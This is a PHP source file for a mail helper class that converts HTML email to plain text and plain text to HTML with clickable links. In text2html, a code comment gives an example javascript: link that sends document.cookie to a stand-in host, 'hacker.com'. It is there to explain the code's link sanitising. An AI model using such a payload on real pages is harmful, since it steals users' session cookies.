<?php
// +----------------------------------------------------------------------
// | WZYCODING [ SIMPLE SOFTWARE IS THE BEST ]
// +----------------------------------------------------------------------
// | Copyright (c) 2018~2025 wzycoding All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://license.coscl.org.cn/MulanPSL2 )
// +----------------------------------------------------------------------
// | Author: wzycoding <wzycoding@qq.com>
// +----------------------------------------------------------------------
namespace mail;

class MailMessage{
    public static function html2text($text){
// strip HTML, and turn links into the full URL
        $text = preg_replace("/\r/", '', $text);

        $text = preg_replace("/<script[^>]*>(.*?)<\/script\s*>/is", '', $text);
        $text = preg_replace("/<style[^>]*>(.*?)<\/style\s*>/is", '', $text);

        $text = preg_replace("/<a[^>]*href=[\"\'](.*)[\"\'][^>]*>(.*)<\/a>/Umis",
            "[URLTEXT]\\2[ENDURLTEXT][LINK]\\1[ENDLINK]\n", $text);
        $text = preg_replace("/<b>(.*?)<\/b\s*>/is", '*\\1*', $text);
        $text = preg_replace("/<h[\d]>(.*?)<\/h[\d]\s*>/is", "**\\1**\n", $text);

        $text = preg_replace("/<i>(.*?)<\/i\s*>/is", '/\\1/', $text);
        $text = preg_replace("/<\/tr\s*?>/i", "<\/tr>\n\n", $text);
        $text = preg_replace("/<\/p\s*?>/i", "<\/p>\n\n", $text);
        $text = preg_replace('/<br[^>]*?>/i', "<br>\n", $text);
        $text = preg_replace("/<br[^>]*?\/>/i", "<br\/>\n", $text);
        $text = preg_replace('/<table/i', "\n\n<table", $text);
        $text = strip_tags($text);

        // find all URLs and replace them back
        preg_match_all('~\[URLTEXT\](.*)\[ENDURLTEXT\]\[LINK\](.*)\[ENDLINK\]~Umis', $text, $links);
        foreach ($links[0] as $matchindex => $fullmatch) {
            $linktext = $links[1][$matchindex];
            $linkurl = $links[2][$matchindex];
            // check if the text linked is a repetition of the URL
            if (trim($linktext) == trim($linkurl) ||
                'http://'.trim($linktext) == trim($linkurl)
            ) {
                $linkreplace = $linkurl;
            } else {
                //# if link is an anchor only, take it out
                if (strpos($linkurl, '#') !== false) {
                    $linkreplace = $linktext;
                } else {
                    $linkreplace = $linktext.' <'.$linkurl.'>';
                }
            }
            //  $text = preg_replace('~'.preg_quote($fullmatch).'~',$linkreplace,$text);
            $text = str_replace($fullmatch, $linkreplace, $text);
        }
        $text = preg_replace("/<a href=[\"\'](.*?)[\"\'][^>]*>(.*?)<\/a>/is", '[URLTEXT]\\2[ENDURLTEXT][LINK]\\1[ENDLINK]',
            $text, 500);

        $text = self::replaceChars($text);

        $text = preg_replace('/###NL###/', "\n", $text);
        $text = preg_replace("/\n /", "\n", $text);
        $text = preg_replace("/\t/", ' ', $text);

        // reduce whitespace
        while (preg_match('/  /', $text)) {
            $text = preg_replace('/  /', ' ', $text);
        }
        while (preg_match("/\n\s*\n\s*\n/", $text)) {
            $text = preg_replace("/\n\s*\n\s*\n/", "\n\n", $text);
        }
        $ww = 70;

        $text = wordwrap($text, $ww);

        return $text;
    }
    public static function text2html($text){
        // bug in PHP? get rid of newlines at the beginning of text
        $text = ltrim($text);

        // make urls and emails clickable
        $text = preg_replace("/([\._a-z0-9-]+@[\.a-z0-9-]+)/i", '<a href="mailto:\\1" class="email">\\1</a>', $text);
        $link_pattern = "/(.*)<a.*href\s*=\s*\"(.*?)\"\s*(.*?)>(.*?)<\s*\/a\s*>(.*)/is";

        $i = 0;
        while (preg_match($link_pattern, $text, $matches)) {
            $url = $matches[2];
            $rest = $matches[3];
            if (!preg_match('/^(http:)|(mailto:)|(ftp:)|(https:)/i', $url)) {
                // avoid this
                //<a href="javascript:window.open('http://hacker.com?cookie='+document.cookie)">
                $url = preg_replace('/:/', '', $url);
            }
            $link[$i] = '<a href="'.$url.'" '.$rest.'>'.$matches[4].'</a>';
            $text = $matches[1]."%%$i%%".$matches[5];
            ++$i;
        }

        $text = preg_replace("/(www\.[a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i", 'http://\\1', $text); //make www. -> http://www.
        $text = preg_replace("/(https?:\/\/)http?:\/\//i", '\\1', $text); //take out duplicate schema
        $text = preg_replace("/(ftp:\/\/)http?:\/\//i", '\\1', $text); //take out duplicate schema
        $text = preg_replace("/(https?:\/\/)(?!www)([a-zA-Z0-9\.\/#~:?+=&%@!_\\-]+)/i",
            '<a href="\\1\\2" class="url" target="_blank">\\2</a>',
            $text); //eg-- http://kernel.org -> <a href"http://kernel.org" target="_blank">http://kernel.org</a>

        $text = preg_replace("/(https?:\/\/)(www\.)([a-zA-Z0-9\.\/#~:?+=&%@!\\-_]+)/i",
            '<a href="\\1\\2\\3" class="url" target="_blank">\\2\\3</a>',
            $text); //eg -- http://www.google.com -> <a href"http://www.google.com" target="_blank">www.google.com</a>

        // take off a possible last full stop and move it outside
        $text = preg_replace("/<a href=\"(.*?)\.\" class=\"url\" target=\"_blank\">(.*)\.<\/a>/i",
            '<a href="\\1" class="url" target="_blank">\\2</a>.', $text);

        for ($j = 0; $j < $i; ++$j) {
            $replacement = $link[$j];
            $text = preg_replace("/\%\%$j\%\%/", $replacement, $text);
        }

        // hmm, regular expression choke on some characters in the text
        // first replace all the brackets with placeholders.
        // we cannot use htmlspecialchars or addslashes, because some are needed

        $text = str_replace("\(", '<!--LB-->', $text);
        $text = str_replace("\)", '<!--RB-->', $text);
        $text = preg_replace('/\$/', '<!--DOLL-->', $text);

        // @@@ to be xhtml compabible we'd have to close the <p> as well
        // so for now, just make it two br/s, which will be done by replacing
        // \n with <br/>
        $br = '<br />';
        $text = preg_replace("/\r/", '', $text);
        $text = preg_replace("/\n/", "$br\n", $text);

        // reverse our previous placeholders
        $text = str_replace('<!--LB-->', '(', $text);
        $text = str_replace('<!--RB-->', ')', $text);
        $text = str_replace('<!--DOLL-->', '$', $text);

        return $text;
    }
    public static function replaceChars($text){

        $search = array(
            "'&(quot|#34);'i",  // Replace html entities
            "'&(amp|#38);'i",
            "'&(lt|#60);'i",
            "'&(gt|#62);'i",
            "'&(nbsp|#160);'i",
            "'&(iexcl|#161);'i",
            "'&(cent|#162);'i",
            "'&(pound|#163);'i",
            "'&(copy|#169);'i",
            "'&rsquo;'i",
            "'&ndash;'i",
        );

        $replace = array(
            '"',
            '&',
            '<',
            '>',
            ' ',
            chr(161),
            chr(162),
            chr(163),
            chr(169),
            "'",
            '-',
        );
        $text = preg_replace($search, $replace, $text);
        $text = html_entity_decode($text, ENT_QUOTES, 'UTF-8');
        return $text;
    }
}